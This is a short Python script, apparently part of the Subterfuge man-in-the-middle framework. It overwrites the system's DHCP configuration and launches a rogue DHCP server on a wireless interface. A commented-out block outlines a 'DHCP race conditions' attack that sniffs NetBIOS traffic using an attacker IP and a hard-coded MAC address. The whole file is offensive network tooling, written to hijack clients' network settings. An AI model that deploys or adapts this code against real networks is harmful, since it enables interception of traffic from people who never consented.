#!/usr/bin/python
#################
#This file is used to exploit the network through DHCP Conditions
#################
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
sys.path.append('/usr/share/subterfuge')
sys.path.append('/usr/share/subterfuge/utilities')
   #Import Subterfuge Dependencies
from subutils import globalvars
from dhcptools import *


globalvar = globalvars()

   
   #Build the ISC DHCP Server Config
print "Building dhcp.conf"
with open('dhcpd.conf', 'r') as file:
   conf = file.readlines()
#conf[6] = 'subnet 10.31.33.0 netmask 255.255.255.0' + '\n'
with open('dhcpd.conf', 'w') as file:
   file.writelines(conf)
   
   #Set Config
os.system('rm /etc/dhcp/dhcpd.conf')
os.system('cp dhcpd.conf /etc/dhcp/')
   
   #Launch the Rogue DHCP Server
print "Launching Rogue DHCP Server..."
os.system("dhcpd wlan0")

   #DHCP RACE CONDITIONS ATTACK
'''
print "Listening for DHCP Association Requests..."
while 1:
   data = sniff(filter="udp and port 137", count=1)
   nbQueryCheck(data[0], globalvar['attackerip'], 'f0:7b:cb:4d:d6:6f')
'''